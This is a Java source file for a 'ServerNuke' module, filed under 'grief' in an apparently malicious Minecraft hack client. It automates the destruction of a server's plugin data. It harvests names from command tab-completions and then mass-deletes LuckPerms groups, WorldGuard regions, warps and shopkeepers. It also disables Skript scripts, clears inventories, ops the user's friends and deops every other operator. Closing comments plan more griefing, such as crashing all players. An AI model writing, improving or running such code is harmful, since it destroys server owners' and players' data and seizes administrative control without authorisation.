package net.shadow.feature.module.grief;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.BooleanValue;
import net.shadow.plugin.FriendSystem;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.Utils;

import java.util.Arrays;

public class ServerNuke extends Module implements PacketInput {
    static String packetinputmode = "none";
    final BooleanValue nukelp = this.config.create("LuckPerms", false);
    final BooleanValue nukerandoms = this.config.create("Essentials", false);
    final BooleanValue nukemrl = this.config.create("NukeMRL", false);
    final BooleanValue nukeshopkeepers = this.config.create("Shopkeepers", false);
    final BooleanValue worldguard = this.config.create("WorldGuard", false);
    final BooleanValue misc = this.config.create("Skript", false);
    final BooleanValue permsfriends = this.config.create("GivePerms", false);


    public ServerNuke() {
        super("ServerNuke", "delete plugin data", ModuleType.GRIEF);
    }

    @Override
    public void onEnable() {
        ClientPlayerEntity player = Shadow.c.player;
        new Thread(() -> {
            if (permsfriends.getThis()) {
                for (String s : FriendSystem.friendsystem) {
                    player.sendChatMessage("/op " + s);
                }
            }
            if (misc.getThis()) {
                player.sendChatMessage("/sk disable all");
                Utils.sleep(200);
            }
            if (worldguard.getThis()) {
                packetinputmode = "worldguard";
                Shadow.getEventSystem().add(PacketInput.class, this);
                player.sendChatMessage("/rg list");
                Utils.sleep(2000);
            }
            if (nukemrl.getThis()) {
                Shadow.getEventSystem().add(PacketInput.class, this);
                packetinputmode = "mrl";
                player.sendChatMessage("/mrl list");
                Utils.sleep(2000);
            }
            if (nukerandoms.getThis()) {
                player.sendChatMessage("/clear **");
            }
            if (nukelp.getThis()) {
                packetinputmode = "lp";
                Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
                Shadow.getEventSystem().add(PacketInput.class, this);
                Utils.sleep(5000);
            }
            if (nukeshopkeepers.getThis()) {
                player.sendChatMessage("/shopkeeper deleteall admin");
                Utils.sleep(50);
                player.sendChatMessage("/shopkeeper confirm");
            }
            if (nukerandoms.getThis()) {
                packetinputmode = "warps";
                Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
                Shadow.getEventSystem().add(PacketInput.class, this);
                Utils.sleep(1000);
            }
            if (nukerandoms.getThis()) {
                packetinputmode = "deop";
                Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/deop "));
                Shadow.getEventSystem().add(PacketInput.class, this);
                Utils.sleep(1000);
            }
        }).start();
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }


    //eyes and ears
    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (packetinputmode.equals("worldguard")) {
            if (event.getPacket() instanceof GameMessageS2CPacket packet) {
                String message = packet.getMessage().getString();
                ChatUtils.message(message);
                if (message.contains("------------------- Regions -------------------")) {
                    ChatUtils.message("true");
                    message = message.replace("------------------- Regions -------------------", "");
                    message = message.trim();
                    message = message.replace("[Info]", "");
                    message = message.trim();
                    ChatUtils.message(message);
                    String[] arr = message.trim().split(" ");
                    for (String h : arr) {
                        Shadow.c.player.sendChatMessage("/rg delete " + h);
                    }
                    Shadow.getEventSystem().remove(PacketInput.class, this);
                }
            }
        }
        if (packetinputmode.equals("mrl")) {
            if (event.getPacket() instanceof GameMessageS2CPacket packet) {
                String message = packet.getMessage().getString();
                ChatUtils.message(message);
                message = message.replace(",", "");
                String[] based = message.split(" ");
                String[] copied = Arrays.copyOfRange(based, 1, based.length);
                for (String mrl : copied) {
                    Shadow.c.player.sendChatMessage("/mrl erase " + mrl);
                }
                Shadow.getEventSystem().remove(PacketInput.class, this);
            }
        }
        if (packetinputmode.equals("lp")) {
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                Suggestions all = packet.getSuggestions();
                for (Suggestion i : all.getList()) {
                    Shadow.c.player.sendChatMessage("/lp deletegroup " + i.getText());
                }
                Shadow.getEventSystem().remove(PacketInput.class, this);
            }
        }
        if (packetinputmode.equals("warps")) {
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                Suggestions all = packet.getSuggestions();
                for (Suggestion i : all.getList()) {
                    Shadow.c.player.sendChatMessage("/delwarp " + i.getText());
                }
                Shadow.getEventSystem().remove(PacketInput.class, this);
            }
        }
        if (packetinputmode.equals("deop")) {
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                Suggestions all = packet.getSuggestions();
                for (Suggestion i : all.getList()) {
                    if (i.getText().strip().equalsIgnoreCase(Shadow.c.player.getGameProfile().getName()) || FriendSystem.isFriend(i.getText())) {
                        return;
                    }
                    Shadow.c.player.sendChatMessage("/deop " + i.getText());
                }
                Shadow.getEventSystem().remove(PacketInput.class, this);
            }
        }
    }
}
//crash @a button
//friends system
//give the friends star perms
//deop all non-moles
